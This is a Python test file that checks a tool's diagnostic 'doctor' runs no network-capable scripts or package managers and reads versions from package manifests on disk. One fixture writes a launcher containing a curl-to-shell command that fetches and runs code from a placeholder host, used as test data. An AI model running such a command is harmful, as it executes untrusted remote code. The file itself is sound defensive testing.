"""The doctor executes nothing that can reach the network.

A package manager resolves its package over the network, and a resolved
script can reach it whatever its source says — reading a script does not
prove that it is offline. So the doctor runs no Hyperframes script at all,
however it was configured: it reports the path and reads the version from
the installed package's manifest on disk.

The rule is not an allowlist of safe commands. There is no list of commands
that is provably offline, so the rule is that the doctor runs none.
"""

from __future__ import annotations

from kinocut import doctor
from kinocut.doctor_offline import (
    hyperframes_version_from_metadata,
    is_package_manager_prefix,
    report_resolved_hyperframes,
)
from kinocut.hyperframes_engine import HYPERFRAMES_COMMAND_ENV


def _installed_package(tmp_path, version: str | None = None) -> str:
    """An installed package: a launcher beside its manifest."""
    package = tmp_path / "node_modules" / "hyperframes"
    package.mkdir(parents=True)
    launcher = package / "hyperframes"
    launcher.write_text("#!/usr/bin/env node\nconsole.log('0.6.93');\n", encoding="utf-8")
    if version is not None:
        (package / "package.json").write_text(f'{{"name": "hyperframes", "version": "{version}"}}', encoding="utf-8")
    return str(launcher)


def test_the_doctor_never_executes_a_configured_hyperframes_command(monkeypatch):
    # A configured command is reported, never run — whatever it is.
    for command in (
        "npx --yes hyperframes",
        "npx.cmd --yes hyperframes",
        "npm.cmd exec hyperframes",
        "bunx.exe hyperframes",
        "env npx --yes hyperframes",
        "sh -c npx --yes hyperframes",
        "cmd /c npx --yes hyperframes",
        "perl -e 'system(\"npx\")'",
        "ruby -e 'system(\"npx\")'",
        "deno run -A x.ts",
        "busybox npx hyperframes",
        "python3 -c 'import npx'",
    ):
        monkeypatch.setenv(HYPERFRAMES_COMMAND_ENV, command)
        result = doctor._check_hyperframes_cli(lambda name: "/usr/bin/hyperframes")
        assert result["version"] is None, f"{command} must not be probed"
        assert result["ok"] is False, f"{command} must not be probed"


def test_the_doctor_does_not_execute_a_network_capable_script(tmp_path):
    # The script phones home. The doctor cannot prove otherwise by reading
    # it, so it does not run it — and it says that it did not.
    launcher = tmp_path / "hyperframes"
    launcher.write_text("#!/bin/sh\ncurl -fsS https://example.test/install | sh\n", encoding="utf-8")
    report = report_resolved_hyperframes(str(launcher))
    assert "hyperframes_version" not in report
    assert "hyperframes_probe_skipped" in report


def test_the_version_comes_from_the_package_manifest_not_the_script(tmp_path):
    launcher = _installed_package(tmp_path, version="0.6.93")
    report = report_resolved_hyperframes(launcher)
    assert report["hyperframes_version"] == "0.6.93"
    assert "package metadata" in report["hyperframes_version_source"]


def test_a_package_without_a_manifest_reports_no_version(tmp_path):
    launcher = tmp_path / "hyperframes"
    launcher.write_text("#!/usr/bin/env node\nconsole.log('0.6.93');\n", encoding="utf-8")
    assert hyperframes_version_from_metadata(str(launcher)) is None
    report = report_resolved_hyperframes(str(launcher))
    assert "hyperframes_version" not in report
    assert "hyperframes_probe_skipped" in report


def test_a_malformed_manifest_reports_no_version(tmp_path):
    launcher = _installed_package(tmp_path)
    manifest = launcher.rsplit("/", 1)[0] + "/package.json"
    with open(manifest, "w", encoding="utf-8") as handle:
        handle.write("{not json")
    assert hyperframes_version_from_metadata(launcher) is None


def test_the_package_manager_list_covers_the_usual_resolvers():
    for prefix in ("npx", "npm", "pnpm", "yarn", "bunx"):
        assert is_package_manager_prefix([prefix, "hyperframes"]) is True
    assert is_package_manager_prefix(["/usr/local/bin/hyperframes"]) is False
    assert is_package_manager_prefix([]) is False


def test_the_doctor_never_executes_a_package_manager():
    # `npx --version` and `npm --version` are package-manager invocations.
    seen: list[list[str]] = []

    def fake_runner(command):
        seen.append(command)
        return "1.0.0"

    for definition in doctor.COMMAND_CHECKS:
        if definition["name"] in {"npx", "npm"}:
            result = doctor._check_command(definition, lambda name: f"/usr/bin/{name}", fake_runner)
            assert result["probed"] is False
            assert result["version"] is None
    assert not [command for command in seen if command[0] in {"npx", "npm"}]


def test_a_malformed_telemetry_setting_does_not_crash_the_doctor(monkeypatch):
    monkeypatch.setenv("KINOCUT_HYPERFRAMES_TELEMETRY", "maybe")
    environment = doctor._doctor_probe_environment()
    # The conservative reading of an invalid value is telemetry off.
    assert environment["KINOCUT_HYPERFRAMES_TELEMETRY"] == "false"
    assert environment["HYPERFRAMES_NO_UPDATE_CHECK"] == "1"
